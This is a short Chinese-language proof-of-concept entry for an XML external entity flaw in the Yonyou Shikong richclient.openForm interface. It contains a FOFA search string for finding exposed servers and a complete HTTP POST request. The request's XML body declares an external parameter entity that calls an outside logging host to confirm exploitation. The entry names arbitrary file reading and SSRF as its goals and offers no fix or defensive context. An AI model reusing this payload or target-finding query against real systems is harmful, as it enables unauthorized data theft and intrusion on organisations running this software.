## 用友时空-richclient.openForm-XXE漏洞

## 一、漏洞简介
用友时空 richclient.openForm 接口处存在XML实体注入漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。

## fofa
```
body="时空智友"
```

## POC
```
POST /formservice?service=richclient.openForm HTTP/1.1
Host: [目标服务器]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 121
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://dlrcjhqkki.dgrh3.cn">%remote;]>
<root/>
```
